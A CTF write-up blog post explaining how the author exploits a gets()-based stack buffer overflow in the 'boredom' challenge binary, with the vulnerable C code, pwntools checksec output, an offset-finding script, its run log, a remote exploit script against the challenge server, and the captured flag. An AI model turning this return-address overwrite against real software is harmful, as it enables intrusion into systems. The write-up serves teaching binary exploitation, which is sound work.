---
layout: post
author: andrea
tags: ctf
---
_Boredom_ is the the first ctf of binary exploitation. It provides a source file **boredom.c** and a binary file **boredom**.

First, I analyze the source code to find some exploitable code. Indeed, the main call the unsafe function <code class="cpp hljs inline"> gets </code>:

<pre><code class="cpp hljs">
	int main() {
		char toDo[200];
		setup();

		printf("Give me something to do: ");
		gets(toDo);
		puts("Ehhhhh, maybe later.");
		return 0;
	}
</code></pre>

<code class="cpp hljs inline">gets</code> saves the input in the char array <code class="cpp hljs inline">toDo</code> and it can overwrite the return instruction pointer in the stack if the user writes more than 200 characters. The other function in **boredom.c** tells us where the flag is located:

<pre><code class="cpp hljs">
	void flag() {
		FILE &#42;f = fopen("flag.txt", "r");
		char buf[50];
		if (f == NULL) {
			puts("You're running this locally or I can't access the flag file for some reason.");
			puts("If this occurs on the remote, ping @PMP#5728 on discord server.");
			exit(1);
		}
		fgets(buf, 50, f);
		printf("Hey, that's a neat idea. Here's a flag for your trouble: %s\n", buf);
		puts("Now go away.");
		exit(42);
	}	
</code></pre>

We just need to find the address of function <code class="cpp hljs inline">flag</code> and overwrite it in the return instruction pointer in the stack. However, even though this is the main concept behind the buffer overflow exploit, there are a lot of details to make it real.

## Architecture characteristics

Before writing any exploit we have to understand in which architecture the **boredom** binary is running. The <code class="bash hljs inline">readelf -h boredom</code> command answers to all our questions:

<pre><code class="plaintext hljs">
	ELF Header:
	Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
	Class:                             ELF64
	Data:                              2's complement, little endian
	Version:                           1 (current)
	OS/ABI:                            UNIX - System V
	ABI Version:                       0
	Type:                              EXEC (Executable file)
	Machine:                           Advanced Micro Devices X86-64
</code></pre>

Boom! It is 64bit architecture and little-endian (least significant byte are stored in the smallest address, e.g. higher in the stack).

Now we use our swiss army knife, aka pwntools, to get some other interesting features of this binary:

<pre><code class="python hljs">
	#!/usr/bin/python3
	from pwn import &#42;
	e = ELF('./boredom')
	print(e)
</code></pre>


the output is:

<pre><code class="plaintext hljs">
	Arch:     amd64-64-little
	RELRO:    Full RELRO
	Stack:    No canary found
	NX:       NX enabled
	PIE:      No PIE (0x400000)
</code></pre>

- _amd-64-little_ tells what we already know;
- _Full RELRO_: the Global Offset Table (GOT) is read-only, that is we can't change the function addresses.
- _No canary found_: the stack doesn't protect the return pointer if we try to overwrite it. This is the vulnerability we are exploiting.
- _NO PIE_: NO Position-Independent Executable, so the code can't run in any address but in those addresses specified by the binary file. In a _PIE_ file there are offsets instead of addresses.

## Exploit

Knowing all these characteristics of the the binary, we remain to guess the offset between the buffer <code class="cpp hljs inline">toDo</code> and the return instruction pointer in the stack. So when the program asks for the input we'll write 200 chars + offset + address of <code class="cpp hljs inline">flag()</code>.

<pre><code class="python hljs">
	#!/usr/bin/python3
	from pwn import &#42;
	e = ELF('./boredom')
	flag&#95;addr = p64(e.symbols['flag'])
	
	for i in range(201,220):
		print('i: ' + str(i))
		p = process('./boredom')
		payload = bytes("a"*i,'utf-8') + flag&#95;addr
		p.sendlineafter(': ', payload)
		res = p.recvall(timeout=1)
		if "flag" in res.decode():
			print(res.decode())
			break;
</code></pre>

where <code class="cpp hljs inline">flag&#95;addr = \xd5\x11\x40\x00\x00\x00\x00\x00</code> is 8 byte long.

When the binary returns _You're running this locally or I can't access the flag file for some reason._ we have found the right offset.

**In my case** the offset is 16 bytes:

<pre><code class="plaintext hljs">
	...
	i: 215
	[+] Starting local process './boredom': pid 203
	[+] Receiving all data: Done (21B)
	[*] Process './boredom' stopped with exit code -11 (SIGSEGV) (pid 203)
	i: 216
	[+] Starting local process './boredom': pid 206
	[+] Receiving all data: Done (162B)
	[*] Process './boredom' stopped with exit code 1 (pid 206)
	Ehhhhh, maybe later.
	You're running this locally or I can't access the flag file for some reason.
	If this occurs on the remote, ping @PMP#5728 on discord server.

	i: 217
	[+] Starting local process './boredom': pid 209
	[+] Receiving all data: Done (21B)
	[*] Process './boredom' stopped with exit code -11 (SIGSEGV) (pid 209)
	...
</code></pre>

We exploited the buffer overflow locally now it's time to make it working remotely:

<pre><code class="python hljs">
	#!/usr/bin/python3
	from pwn import *

	p = remote('pwn.hsctf.com', 5002)

	flag_addr = 0x00000000004011d5
	print( bytes('a'*(208),'utf-8')+p64(flag_addr))
	p.sendlineafter(': ', bytes('a'*(208),'utf-8')+p64(flag_addr))

	p.interactive()
</code></pre>

Unfortunately, the offset that we use to pwn the binary online is different from that we used locally. The offset is just 8 bytes instead of 16 bytes.

Eventually, the flag is:

<pre><code class="plaintext hljs">
	flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}
</code></pre>

## Resources

- [https://ctf.hsctf.com/](https://ctf.hsctf.com/)
- [Relocation Read-Only (RELRO)](https://ctf101.org/binary-exploitation/relocation-read-only/)